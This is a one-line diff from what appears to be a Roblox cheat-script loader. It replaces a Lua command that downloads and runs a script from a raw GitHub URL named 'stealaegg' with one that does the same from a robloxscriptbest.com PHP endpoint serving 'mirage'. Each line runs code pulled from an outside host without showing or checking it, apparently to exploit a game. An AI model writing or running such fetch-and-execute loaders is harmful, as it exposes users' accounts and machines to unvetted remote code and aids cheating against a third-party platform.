@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/miirandahub/loader/refs/heads/main/stealaegg"))()
+loadstring(game:HttpGet("https://robloxscriptbest.com/script/loader.php?script=mirage"))()
